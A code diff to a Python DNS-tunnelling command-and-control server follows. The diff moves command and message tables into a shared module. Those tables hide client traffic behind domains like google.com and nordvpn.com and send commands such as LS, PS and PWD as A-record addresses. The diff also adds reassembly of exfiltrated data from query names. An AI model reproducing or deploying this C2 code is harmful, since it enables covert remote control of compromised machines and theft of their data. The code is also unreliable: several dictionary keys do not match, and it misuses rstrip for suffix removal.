@@ -5,6 +5,8 @@ from typing import Any, Dict
 
 from dnslib import *
 
+from shared import client_to_serv, serv_to_client
+
 
 class Command:
     def __init__(self, addr):
@@ -31,21 +33,6 @@ class Server:
         self.listening_port = args.port
         self.listening_ip = args.ip
 
-        self.serv_to_client = {
-            "LS": "1.2.3.2",
-            "W": "1.2.3.3",
-            "PS": "1.2.3.5",
-            "PWD": "1.2.3.6",
-            "ACK": "1.2.3.4",
-            "RST": "1.2.4.3",
-            "NOP": "1.2.3.1"
-        }
-        self.client_to_serv = {
-            "HB": "google.com",
-            "RESP": "ntppool.org",
-            "DONE": "nordvpn.com"
-        }
-
         self.connected_clients = {}
         self.commands_for_clients: Dict[Any, Command] = {}
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -58,7 +45,7 @@ class Server:
     def __log(self, message):
         if self.silent:
             return
-        print("CC: {}".format(message))
+        print("CCS: {}".format(message))
 
     def run(self):
         if self.running:
@@ -74,17 +61,17 @@ class Server:
             data, addr = self.socket.recvfrom(1024)
             request = DNSRecord.parse(data)
 
-            if request.get_q().get_qname().matchGlob(self.client_to_serv["HB"]):
+            if request.get_q().get_qname().matchGlob(client_to_serv["HB"]):
                 # It is a heartbeat..
                 self.__log("{} Heartbeat".format(addr))
 
                 repl = self.heartbeat_reply(request.reply(), addr)
-            elif request.get_q().get_qname().matchGlob(self.client_to_serv["response"]):
+            elif request.get_q().get_qname().matchGlob(client_to_serv["response"]):
                 # It is a reply for our request:
                 self.__log("{}: We got a response for our request!".format(addr))
 
                 repl = self.extract_data_from_request(request, addr)
-            elif request.get_q().get_qname().matchGlob(self.client_to_serv["done"]):
+            elif request.get_q().get_qname().matchGlob(client_to_serv["done"]):
                 # The client has finished sending us data...
                 self.__log("{}: Finished request".format(addr))
                 repl = self.finished_stream(request, addr)
@@ -97,40 +84,38 @@ class Server:
     def finished_stream(self, request, addr):
         if addr not in self.connected_clients or not self.commands_for_clients[addr].started:
             self.__log("{}: ERROR: Got a protocol-violated message! Sending reset signal...".format(addr))
-            command = self.serv_to_client["RST"]
+            command = serv_to_client["RST"]
 
         else:
             self.__log(
                 "{}: Finished receiving stream for command: {}".format(addr, self.commands_for_clients[addr].command))
-            command = self.serv_to_client["ACK"]
+            command = serv_to_client["ACK"]
 
         repl = request.reply()
         repl.add_answer(RR(request.get_q().get_qname(), QTYPE.A, rdata=A(command), ttl=60))
 
         return repl
 
-    def decode_segment(self, data):
+    def from_segment(self, data):
         """
-        Decodes and returns a segment
+        returns parsed data from segment
         """
 
-        # TODO:
-        return data
-
+        return "".join(data.rstrip(client_to_serv["RESP"]).split('.'))
 
     def extract_data_from_request(self, request, addr):
         if addr not in self.connected_clients or not self.commands_for_clients[addr].started:
             self.__log("{}: ERROR: Got a protocol-violated message! Sending reset signal...".format(addr))
-            command = self.serv_to_client["RST"]
+            command = serv_to_client["RST"]
         else:
             self.__log("{}: Got data segment for command: {}".format(addr, self.commands_for_clients[addr].command))
 
             qname = str(request.get_q().get_qname())
-            qname = qname.rstrip(self.client_to_serv["RESP"])
+            qname = qname.rstrip(client_to_serv["RESP"])
 
-            self.commands_for_clients[addr].add_segment(self.decode_segment(qname))
+            self.commands_for_clients[addr].add_segment(self.from_segment(qname))
 
-            command = self.serv_to_client["ACK"]
+            command = serv_to_client["ACK"]
 
         repl = request.reply()
         repl.add_answer(RR(request.get_q().get_qname(), QTYPE.A, rdata=A(command), ttl=60))
@@ -143,11 +128,11 @@ class Server:
         if new_one:
             # We register a new client
             self.commands_for_clients[new_one] = Command(addr)
-            command = self.serv_to_client["ACK"]
+            command = serv_to_client["ACK"]
 
         elif self.commands_for_clients[addr].completed:
             # We do not have any commands for this machine
-            command = self.serv_to_client["NOP"]
+            command = serv_to_client["NOP"]
 
         else:
             # We have job for you!
@@ -165,7 +150,7 @@ class Server:
             return
 
         reply = request.reply()
-        reply.add_answer(RR(self.client_to_serv["HB"], QTYPE.A, rdata=A(command), ttl=60))
+        reply.add_answer(RR(client_to_serv["HB"], QTYPE.A, rdata=A(command), ttl=60))
         self.__log("{}: Sending {} command...".format(addr, command))
         return reply
 
